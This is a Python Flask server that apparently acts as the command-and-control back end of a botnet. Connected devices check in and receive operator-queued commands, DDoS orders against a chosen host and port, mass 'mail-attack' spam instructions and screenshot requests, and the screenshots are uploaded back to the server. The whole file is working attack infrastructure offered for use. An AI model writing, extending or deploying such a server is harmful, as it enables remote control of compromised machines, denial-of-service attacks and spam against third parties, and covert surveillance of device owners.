from flask import *
import json
import os
import time

thisDir = os.path.dirname(os.path.abspath(__file__))
app = Flask(__name__)
app.secret_key = "secret_key"
connects = {}
commands = []
mail_attack = {"set-time": time.time()}
ddos = {"set-time": time.time()}
screenshot = 0


@app.route("/", methods=["POST", "GET"])
def index():
    if request.method == "POST" and request.form.get("password") == "password":  # Your login password.
        session["admin"] = "admin"
    if not session.get("admin"):
        return render_template("login.html")
    global connects
    connects_ = {}
    for i, j in connects.items():
        if time.time() - j <= 15:
            connects_[i] = j
    connects = connects_
    return render_template("index.html", users=connects)


@app.route("/upload", methods=["POST"])
def upload():
    f = request.files["file"]
    upload_path = "%s/static/%s.jpg" % (thisDir, request.form.get("name"))
    f.save(upload_path)
    return "OK"


@app.route("/init", methods=["POST"])
def start():
    connects[request.form.get("name")] = time.time()
    print("新的设备（%s）成功连接到服务器" % request.form.get("name"))
    result = {"action": len(commands)}
    return json.dumps(result)


@app.route("/connect", methods=["POST"])
def connect():
    result = {"getScreen": connects[request.form.get("name")] < screenshot}

    if len(commands) > int(request.form.get("action")):
        result["actions"] = commands[int(request.form.get("action")):]
    else:
        result["actions"] = None
    result["action"] = len(commands)

    if mail_attack["set-time"] > connects[request.form.get("name")]:
        result["mail-attack"] = mail_attack
        result["mail-attack"]["do"] = True
    else:
        result["mail-attack"] = {"do": False}

    if ddos["set-time"] > connects[request.form.get("name")]:
        result["DDOS"] = ddos
        result["DDOS"]["do"] = True
    else:
        result["DDOS"] = {"do": False}

    connects[request.form.get("name")] = time.time()

    return json.dumps(result)


@app.route("/action", methods=["POST"])
def sub_action():
    commands.append(request.form.get("command"))
    return redirect("/")


@app.route("/ddos", methods=["POST"])
def sub_ddos():
    global ddos
    ddos = request.form.to_dict().copy()
    ddos["times"] = int(ddos["times"])
    ddos["port"] = int(ddos["port"])
    ddos["set-time"] = time.time()
    return redirect("/")


@app.route("/mail-attack", methods=["POST"])
def sub_mail_attack():
    global mail_attack
    mail_attack = request.form.to_dict().copy()
    mail_attack["times"] = int(mail_attack["times"])
    mail_attack["set-time"] = time.time()
    if request.form.get("title") or request.form.get("content") or\
            request.form.get("from-name"):
        mail_attack["easy"] = False
    else:
        mail_attack["easy"] = True
    return redirect("/")


@app.route("/screenshot", methods=["POST"])
def sub_screenshot():
    global screenshot
    screenshot = time.time()
    return redirect("/")


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5001)
